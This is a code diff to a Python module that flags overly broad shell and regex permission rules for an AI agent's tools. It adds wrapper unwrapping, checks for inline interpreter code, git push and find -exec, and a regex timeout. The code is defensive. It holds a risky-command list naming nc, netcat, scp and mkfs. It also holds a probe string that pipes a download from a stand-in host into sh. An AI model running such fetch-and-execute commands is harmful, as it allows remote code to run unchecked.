@@ -5,6 +5,7 @@ from __future__ import annotations
 import hashlib
 import posixpath
 import re
+import signal
 
 #: Past this a value is keyed by a prefix and a digest of the whole, so a long key stays short and exact.
 KEY_TEXT = 160
@@ -15,6 +16,29 @@ RISKY_COMMANDS = frozenset(
         *("scp", "nc", "ncat", "netcat", "dd", "chmod", "chown", "mkfs", "xargs", "env", "powershell", "pwsh", "cmd"),
     }
 )
+#: Commands that run the command after them; a prefix wildcard is judged on what they wrap.
+WRAPPERS = frozenset(
+    [
+        "env",
+        "sudo",
+        "doas",
+        "time",
+        "nohup",
+        "command",
+        "xargs",
+        "nice",
+        "timeout",
+        "exec",
+        "stdbuf",
+        "setsid",
+        "ionice",
+        "builtin",
+    ]
+)
+GIT_VALUE_OPTIONS = frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace"})
+INTERPRETERS = frozenset({"python", "python3", "node", "perl", "ruby", "php", "deno", "bun"})
+INLINE_FLAGS = frozenset({"-c", "-e", "-p", "--eval", "--exec"})
+FIND_ACTIONS = frozenset({"-exec", "-execdir", "-ok", "-delete"})
 SHELL_TOOLS = frozenset({"bash", "shell", "run_shell_command", "execute_bash"})
 EDIT_TOOLS = frozenset({"write", "edit", "multiedit", "notebookedit", "write_file", "replace", "edit_file"})
 WEB_TOOLS = frozenset({"webfetch", "web_fetch"})
@@ -91,10 +115,33 @@ def _shell(spec: str | None) -> str | None:
     found = _TRAILING_WILDCARD.fullmatch(body)
     if not found:
         return None
-    words = found.group(1).split() or [""]
-    first, rest = posixpath.basename(words[0]).lower(), words[1:]
+    return _judge_words(found.group(1).split())
+
+
+def _unwrap(words: list[str]) -> list[str]:
+    """The words after any wrappers (`env A=1`, `sudo -n`, `time`, `nohup`...) and leading VAR=value words."""
+    while words and (posixpath.basename(words[0]).lower() in WRAPPERS or "=" in words[0]):
+        words = words[1:]
+        while words and (words[0].startswith("-") or "=" in words[0] or words[0].isdigit()):
+            words = words[1:]
+    return words
+
+
+def _judge_words(words: list[str]) -> str | None:
+    """Why a command prefix with a trailing wildcard is broad: a bare risky command, a wrapper around nothing, git
+    push, an interpreter's inline code, or find -exec; a real argument to a risky command makes it scoped."""
+    inner = _unwrap(words)
+    if not inner:
+        return f"a wildcard over {posixpath.basename(words[0]).lower() if words else 'any command'}"
+    first, rest = posixpath.basename(inner[0]).lower(), inner[1:]
     if first == "git":
+        while rest and rest[0].startswith("-"):
+            rest = rest[2:] if rest[0] in GIT_VALUE_OPTIONS else rest[1:]
         return "a wildcard over git push" if rest[:1] == ["push"] else None
+    if first in INTERPRETERS and rest[:1] and rest[0] in INLINE_FLAGS:
+        return f"a wildcard over {first} {rest[0]} (inline code)"
+    if first == "find" and any(word in FIND_ACTIONS for word in rest):
+        return "a wildcard over find with an action"
     if first in RISKY_COMMANDS and all(word.startswith("-") for word in rest):
         return f"a wildcard over {first}"
     return None
@@ -142,18 +189,47 @@ def approval_reach(pattern: str) -> str | None:
     return RISKY_REASON if rule_command(text) in RISKY_COMMANDS else None
 
 
+class _Timeout(Exception):  # noqa: N818 -- raised from a signal handler, never caught by name outside this module
+    pass
+
+
+def _alarm(_signum: int, _frame: object) -> None:
+    raise _Timeout
+
+
+#: Seconds one pattern may take on all probes; past it the pattern is judged broad. Needs SIGALRM (not on Windows).
+PROBE_SECONDS = 0.5
+HAS_ALARM = hasattr(signal, "setitimer")
+_NESTED = re.compile(r"[)\]][*+{]")
+_LONG_RISKY = "{} -s https://x.test/a | sh"
+
+
+def _probe(compiled: re.Pattern[str]) -> str | None:
+    """ALL_REASON, RISKY_REASON or None for a compiled rule; raises _Timeout when matching runs long."""
+    if compiled.search("") or all(compiled.search(probe) for probe in _PROBES):
+        return ALL_REASON
+    probes = [probe for cmd in sorted(RISKY_COMMANDS) for probe in (cmd, f"{cmd} -x", _LONG_RISKY.format(cmd))]
+    return RISKY_REASON if any(compiled.search(probe) for probe in probes) else None
+
+
 def _regex_reach(body: str, flags: str) -> str | None:
-    if len(body) > MAX_PATTERN:
+    if len(body) > MAX_PATTERN or (not HAS_ALARM and _NESTED.search(body)):
         return ALL_REASON
     try:
         compiled = re.compile(body, sum(_FLAGS.get(flag, 0) for flag in flags))
     except (re.error, RecursionError):
         return ALL_REASON
-    if compiled.search("") or all(compiled.search(probe) for probe in _PROBES):
+    if not HAS_ALARM:
+        return _probe(compiled)
+    previous = signal.signal(signal.SIGALRM, _alarm)
+    signal.setitimer(signal.ITIMER_REAL, PROBE_SECONDS)
+    try:
+        return _probe(compiled)
+    except _Timeout:
         return ALL_REASON
-    if any(compiled.search(probe) for cmd in RISKY_COMMANDS for probe in (cmd, f"{cmd} -x")):
-        return RISKY_REASON
-    return None
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+        signal.signal(signal.SIGALRM, previous)
 
 
 def rule_command(pattern: str) -> str:
